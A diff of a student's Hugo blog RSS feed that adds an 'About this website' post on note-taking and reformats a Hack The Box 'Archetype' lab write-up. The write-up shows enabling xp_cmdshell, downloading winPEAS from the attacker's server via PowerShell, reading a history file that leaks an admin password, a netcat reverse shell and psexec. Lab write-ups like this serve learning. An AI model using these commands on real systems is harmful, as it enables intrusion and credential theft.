@@ -6,7 +6,57 @@
     <description>Recent content in Posts on ML</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 17 Oct 2022 12:33:37 +0200</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 04 Mar 2023 18:31:10 +0100</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>About this website</title>
+      <link>/posts/about_this_website/</link>
+      <pubDate>Sat, 04 Mar 2023 18:31:10 +0100</pubDate>
+      
+      <guid>/posts/about_this_website/</guid>
+      <description>Hi everyone! 🐃
+The past 6 months have been definitely intense.
+I studied really hard to perform well in my exams. That&amp;rsquo;s why during the whole school year I decided to write down my notes digitally, using only emacs and orgmode. I wanted to explore the capabilities of such a nerdy/old-school tool, and it has been a lot of fun! I will list some pros and cons of putting so much effort in note-taking:</description>
+      <content>&lt;p&gt;&lt;strong&gt;Hi everyone&lt;/strong&gt;! 🐃&lt;/p&gt;
+&lt;p&gt;The past 6 months have been definitely intense.&lt;/p&gt;
+&lt;p&gt;I studied really hard to perform well in my exams. That&amp;rsquo;s why during the whole school year
+I decided to write down my notes digitally, using only emacs and &lt;strong&gt;orgmode&lt;/strong&gt;. I wanted to explore
+the capabilities of such a nerdy/old-school tool, and it has been a lot of fun!
+I will list some &lt;em&gt;pros&lt;/em&gt; and &lt;em&gt;cons&lt;/em&gt; of putting so much effort in note-taking:&lt;/p&gt;
+&lt;h2 id=&#34;pros-and-cons&#34;&gt;Pros and Cons&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;PROS&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;You are forced to revise your hand-written notes after class;&lt;/li&gt;
+&lt;li&gt;You are forced to understand things more deeply if you want to write sensed stuff about such technical topics;&lt;/li&gt;
+&lt;li&gt;Studying on your notes is about 30-40% more efficient then studying on lecture slides;&lt;/li&gt;
+&lt;li&gt;The material that you produce can be easily used by others;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CONS&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Time consuming (I mean, &lt;strong&gt;really&lt;/strong&gt; time consuming);&lt;/li&gt;
+&lt;li&gt;Sometimes you lose along the way some details from lecture slides;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
+&lt;p&gt;After all, I had a lot of fun and the process helped me a lot.
+That being said, i probably will not do the same thing this semester. The courses that I am attending now
+are really hands-on, so summaries of classes will not be that usefull.
+I am expecting to graduate within september, so I&amp;rsquo;ll have to optimize my time and resources.&lt;/p&gt;
+&lt;p&gt;If my notes helped you with your exams at &lt;a href=&#34;https://www.unimore.it/&#34;&gt;UNIMORE&lt;/a&gt; 📝, you can offer me a coffe ☕
+&lt;a href=&#34;https://paypal.me/erosslugli?country.x=IT&amp;amp;locale.x=it_IT&#34;&gt;Paypal link&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;daily-dose-of-c-dot-s-dot-meme&#34;&gt;Daily dose of C.S. meme&lt;/h2&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;/ox-hugo/richard.jpg&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
     <item>
       <title>HTB-Archetype</title>
       <link>/posts/archetype/</link>
@@ -37,7 +87,7 @@ me at &lt;strong&gt;&lt;a href=&#34;mailto:matteolugli18@gmail.com&#34;&gt;matte
 &lt;hr&gt;
 &lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 &lt;p&gt;I always start htb boxes with nmap enumeration.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo nmap -sC -sV Archetype
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo nmap -sC -sV Archetype
 Starting Nmap 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2022-09-21 18:40 CEST
 Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Archetype &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.129.206.73&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.59s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
@@ -116,7 +166,7 @@ you are interested.&lt;/p&gt;
 &lt;h2 id=&#34;smb-client&#34;&gt;SMB client&lt;/h2&gt;
 &lt;p&gt;Given what we discovered during enumeration, the simplest thing to
 try is connecting to the machine using SMB client.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -N -L Archetype
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -N -L Archetype
 
      Sharename       Type      Comment
      ---------       ----      -------
@@ -133,7 +183,7 @@ on a particular server.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;We notice the share called &lt;strong&gt;backups&lt;/strong&gt;, which is the only non-admin share,
 that we might be able to access. Let&amp;rsquo;s do it using this command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -N &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;Archetype&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;backups
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -N &lt;span style=&#34;color:#ae81ff&#34;&gt;\\\\&lt;/span&gt;Archetype&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;backups
 smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; ls
 ls
   .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Mon Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; 13:20:57 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
@@ -143,7 +193,7 @@ ls
 	      &lt;span style=&#34;color:#ae81ff&#34;&gt;5056511&lt;/span&gt; blocks of size 4096. &lt;span style=&#34;color:#ae81ff&#34;&gt;2616242&lt;/span&gt; blocks available
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looks like there is a suspicious file: prod.dtsConfig.
 Let&amp;rsquo;s take a peek and check what&amp;rsquo;s in there:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;get prod.dtsConfig
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;get prod.dtsConfig
 
 &amp;lt;DTSConfiguration&amp;gt;
     &amp;lt;DTSConfigurationHeading&amp;gt;
@@ -164,7 +214,7 @@ You can find the download links here&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.secureauth.com/labs/open-source-tools/impacket/&#34;&gt;https://www.secureauth.com/labs/open-source-tools/impacket/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;At the beginning I struggled with finding the documentation for this tool, so i just runned
 the script with no options:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Impacket v0.9.24 - Copyright &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Impacket v0.9.24 - Copyright &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
 
 usage: mssqlclient.py &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-h&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-port PORT&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-db DB&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-windows-auth&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-debug&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-file FILE&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 		      &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-hashes LMHASH:NTHASH&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-no-pass&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-k&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-aesKey hex key&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -184,7 +234,7 @@ options:
   -debug                Turn DEBUG output ON
   -file FILE            input file with commands to execute in the SQL shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After a little bit i figured out the correct way to write the command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
 &amp;lt;client.py Archetype/sql_svc@10.129.206.73 -windows-auth
 Impacket v0.9.24 - Copyright &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
 
@@ -199,7 +249,7 @@ Password:&amp;lt;insert password&amp;gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Press help &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; extra shell commands
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There we go, looks like we can send commands, so i tried
 to run a simple query:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;SQL&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; name from sys.databases
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;SQL&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; name from sys.databases
 master
 tempdb
 model
@@ -208,7 +258,7 @@ msdb
 &lt;h2 id=&#34;command-shell&#34;&gt;Command Shell&lt;/h2&gt;
 &lt;p&gt;I found out that there is a way to execute commands remotly if we have access
 to a ms-sql server: we can use a &lt;em&gt;stored procedure&lt;/em&gt; called &lt;strong&gt;xp_cmdshell&lt;/strong&gt;.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dir *.exe&amp;#39;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dir *.exe&amp;#39;&lt;/span&gt;;
 
 [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;] ERROR(ARCHETYPE): Line &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;SQL&lt;/span&gt; Server blocked &lt;span style=&#34;color:#66d9ef&#34;&gt;access&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;procedure&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sys.xp_cmdshell&amp;#39;&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; component &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt; because this component &lt;span style=&#34;color:#66d9ef&#34;&gt;is&lt;/span&gt; turned &lt;span style=&#34;color:#66d9ef&#34;&gt;off&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; part &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; the &lt;span style=&#34;color:#66d9ef&#34;&gt;security&lt;/span&gt; configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this server.
@@ -220,7 +270,7 @@ is disabled in the configuration file. Let&amp;rsquo;s try to follow the suggest
 given by the error prompt (&#39;[&amp;hellip;] &lt;em&gt;A system administrator can enable the use of &amp;lsquo;xp_cmdshell&amp;rsquo; by using sp_configure&lt;/em&gt;.&#39;).&lt;/p&gt;
 &lt;p&gt;With a quick google search i found out the correct way of using &lt;strong&gt;sp_configure&lt;/strong&gt; to
 enable the shell. (Maybie we are lucky and we can do it without admin privileges).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;sp_configure &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;sp_configure &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
 sp_configure &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
 [&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] INFO(ARCHETYPE): Line &lt;span style=&#34;color:#ae81ff&#34;&gt;185&lt;/span&gt;: Configuration &lt;span style=&#34;color:#66d9ef&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt; changed &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;. Run the RECONFIGURE &lt;span style=&#34;color:#66d9ef&#34;&gt;statement&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;to&lt;/span&gt; install.
 &lt;span style=&#34;color:#66d9ef&#34;&gt;SQL&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; reconfigure
@@ -243,10 +293,10 @@ with &lt;em&gt;privilege escalation&lt;/em&gt; on windows machines.
 It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine.
 To install it on kali or any debian-based distribution you can use the following
 command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install peass
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install peass
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Use this other command to locate all the executable files that you
 just downloaded:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;winpeas --help
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;winpeas --help
 &amp;gt; peass ~ Privilege Escalation Awesome Scripts SUITE
 
 /usr/share/peass/winpeas
@@ -263,12 +313,12 @@ machine (that is by-default listening on port 8000).
 &lt;strong&gt;&lt;em&gt;Remember to run the command from the directory where the winpeas .exe
 files are stored!&lt;/em&gt;&lt;/strong&gt; (I lost a lot of time on this one point).&lt;/p&gt;
 &lt;p&gt;The directory should be /usr/share/peass/winpeas.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -m http.server
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python3 -m http.server
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can use &lt;strong&gt;powershell&lt;/strong&gt; to inject the file!&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&amp;#39;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&amp;#39;&lt;/span&gt;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The file should be loaded in the target machine. Now it&amp;rsquo;s just matter
 of executing it:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c:\\Users\Public\\winPEASx64.exe&amp;#39;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c:\\Users\Public\\winPEASx64.exe&amp;#39;&lt;/span&gt;;
 
 [...]
 &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;╔══════════╣&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Found&lt;/span&gt; History Files
@@ -279,7 +329,7 @@ File: &lt;span style=&#34;color:#66d9ef&#34;&gt;C&lt;/span&gt;:&lt;span style=&#
 [...]
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;History files are usually vulnerable and a good source of information,
 let&amp;rsquo;s see what&amp;rsquo;s inside:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&amp;#39;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&amp;#39;&lt;/span&gt;;
 
 net.exe use T: &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\\&lt;/span&gt;Archetype&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;backups &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;user&lt;/span&gt;:administrator MEGACORP_4dm1n&lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We found administrator credentials!&lt;/p&gt;
@@ -290,7 +340,7 @@ net.exe use T: &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&g
 &lt;h2 id=&#34;reverseshell&#34;&gt;ReverseShell&lt;/h2&gt;
 &lt;p&gt;Now that we have admin credentials, it&amp;rsquo;s time to spawn a reverse-shell.&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/&#34;&gt;https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&amp;#34;&lt;/span&gt;;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&amp;#34;&lt;/span&gt;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can just navigate to C:\Users\sql_svc\Desktop and get the
 user flag.
 We are not done yet, because we still have to find the &lt;strong&gt;root flag&lt;/strong&gt;.&lt;/p&gt;
@@ -299,10 +349,10 @@ cmd prompt, so we need to find a way to spawn a shell &lt;em&gt;as administrator
 Guess what, impacket will help us one more time!
 &lt;a href=&#34;https://blog.ropnop.com/using-credentials-to-own-windows-boxes&#34;&gt;https://blog.ropnop.com/using-credentials-to-own-windows-boxes&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;We can use &lt;strong&gt;psexec.py&lt;/strong&gt; to do exactly what we need:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;psexec.py Archetype/administrator@10.129.189.185
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;psexec.py Archetype/administrator@10.129.189.185
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now just navigate to C:\Users\Administrator\Desktop and get
 the root flag. You can use&lt;/p&gt;
